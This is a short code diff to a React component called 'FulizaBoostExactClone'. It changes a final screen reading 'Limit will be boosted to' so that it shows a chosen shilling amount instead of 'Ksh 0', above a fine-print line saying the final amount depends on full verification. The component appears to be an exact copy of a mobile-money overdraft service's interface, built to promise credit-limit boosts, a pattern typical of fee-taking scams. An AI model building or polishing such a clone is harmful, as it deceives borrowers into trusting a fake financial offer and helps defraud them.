@@ -226,7 +226,7 @@ export default function FulizaBoostExactClone() {
           {step === 'final' && (
             <div className="px-8 py-16 text-center">
               <h2 className="text-3xl font-bold text-emerald-700">Limit will be boosted to</h2>
-              <p className="text-7xl font-bold text-emerald-600 mt-8">Ksh 0</p>
+              <p className="text-7xl font-bold text-emerald-600 mt-8"> {formatKsh(selectedLimit.amount)}</p>
               <p className="mt-8 text-sm text-red-500">* Final amount depends on full verification</p>
             </div>
           )}
